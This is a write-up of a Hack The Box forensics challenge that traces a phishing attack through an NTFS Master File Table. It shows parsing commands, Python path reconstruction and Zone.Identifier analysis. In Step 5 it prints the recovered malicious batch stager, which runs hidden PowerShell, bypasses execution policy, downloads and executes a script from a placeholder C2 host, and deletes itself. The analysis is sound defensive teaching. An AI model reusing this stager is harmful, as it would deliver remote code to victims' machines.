# BFT (Big Forensic Table)

**Platform:** Hack The Box
**Category:** Forensics / DFIR
**Difficulty:** Very Easy
**Status:** Retired

## Overview

This challenge provides a raw NTFS `$MFT` (Master File Table) file for forensic analysis. The scenario involves investigating a phishing attack targeting a user named Simon Stark, who downloaded a malicious ZIP file on February 13, 2024. The attack used nested ZIP archives to deliver a batch file stager that connected to a C2 server.

## Vulnerability / Attack Chain

**Attack Type:** Phishing with staged payload delivery

The attacker used a multi-layered delivery mechanism:

1. **Initial delivery** — A phishing email containing a Google Drive link
2. **First stage** — A ZIP archive hosted on Google Cloud Storage (`storage.googleapis.com`), disguised as a legitimate Drive bulk export
3. **Nested archives** — The ZIP contained another ZIP (`invoice.zip`), which contained yet another ZIP (`invoices.zip`)
4. **Payload** — Inside the innermost archive was `invoice.bat`, a batch file that:
   - Launched PowerShell in hidden mode with execution policy bypass
   - Used the system's default network proxy credentials
   - Downloaded and executed a remote PowerShell script from a C2 server
   - Self-deleted to cover its tracks

This is a classic example of archive nesting to evade email/web security scanners that may not recursively extract multiple levels of compressed files.

## Tools Used

- **analyzeMFT** — Python tool for parsing NTFS Master File Table files into structured CSV
- **Python (custom scripts)** — For reconstructing file paths from MFT parent record relationships and parsing raw MFT records
- **Hex analysis** — Direct reading of raw MFT record bytes to extract resident file content and Zone.Identifier ADS data

## Methodology

### Step 1: Parse the MFT

The challenge provides a single file: a 308MB raw `$MFT`. The first step is converting it into something searchable.

```bash
analyzemft --file '$MFT' --output mft_output.csv --csv
```

This produces ~318,000 records. However, the tool may not reconstruct full file paths, requiring manual path resolution via parent record numbers.

### Step 2: Reconstruct File Paths

MFT records store a parent directory record number rather than full paths. To reconstruct paths, recursively resolve each record's parent chain:

```python
def get_path(recnum, depth=0):
    if depth > 20 or recnum not in records:
        return ''
    rec = records[recnum]
    parent_path = get_path(rec['parent'], depth+1)
    return parent_path + '\\' + rec['name'] if parent_path else rec['name']
```

### Step 3: Identify the Attack Timeline

Filtering for files under the user's profile (`Users\simon.stark`) and looking at the `Downloads` folder reveals the attack chain:

1. **ZIP downloaded** — `Stage-20240213T093324Z-001.zip` appeared in Simon's Downloads folder
2. **Nested extraction** — Inside was `Stage/invoice.zip` → `invoices.zip` → `invoices/invoice.bat`

### Step 4: Extract Zone.Identifier Data

NTFS stores download origin information in the `Zone.Identifier` Alternate Data Stream (ADS). For MFT-resident ADS data, this can be read directly from the raw MFT record:

```python
with open('$MFT', 'rb') as f:
    f.seek(record_number * 1024)
    data = f.read(1024)
    # Parse attributes to find Zone.Identifier ADS
```

The Zone.Identifier for the initial ZIP reveals the Google Cloud Storage HostUrl, confirming the phishing delivery vector.

The inner `invoices.zip` Zone.Identifier shows:
```
ReferrerUrl=C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice.zip
```
This traces the extraction chain.

### Step 5: Extract Resident File Content

The malicious `invoice.bat` is small enough to be stored directly within the MFT record (MFT-resident). By reading the raw `$DATA` attribute from the record, the full script content is revealed:

```batch
@echo off
start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<C2_IP>:<PORT>/download/powershell/<encoded_path>') -UseBasicParsing|iex"
(goto) 2>nul & del "%~f0"
```

Key indicators:
- `-w 1` — Hidden window
- `-nop -ep bypass` — No profile, execution policy bypass
- `DefaultNetworkCredentials` — Steals proxy creds
- `iwr ... | iex` — Download and execute pattern
- `del "%~f0"` — Self-deletion

### Step 6: Calculate Hex Offsets

MFT records are 1024 bytes each. The hex offset of any record is:

```
hex_offset = record_number * 1024
```

This is useful for manual hex editor verification and is a standard forensic documentation practice.

### Step 7: Analyze Timestamps

MFT records contain two sets of timestamps:
- **$STANDARD_INFORMATION (0x10)** — Can be modified by user-level tools (timestomping)
- **$FILE_NAME (0x30)** — More reliable, harder to tamper with

Comparing these timestamps can reveal timestomping attempts. In this case, the `$Created0x30` timestamp provides the true creation time of the malicious file on disk.

## Key Takeaways

- **MFT analysis** is a powerful forensic technique that can reveal file activity even when files have been deleted
- **Zone.Identifier ADS** preserves download origin URLs, making it invaluable for tracing phishing delivery
- **MFT-resident files** allow recovery of small file contents directly from the MFT, even without access to the full disk
- **Nested archive delivery** is a common evasion technique — security tools should recursively inspect archives
- **$FILE_NAME timestamps** are more trustworthy than $STANDARD_INFORMATION timestamps for establishing true file creation times
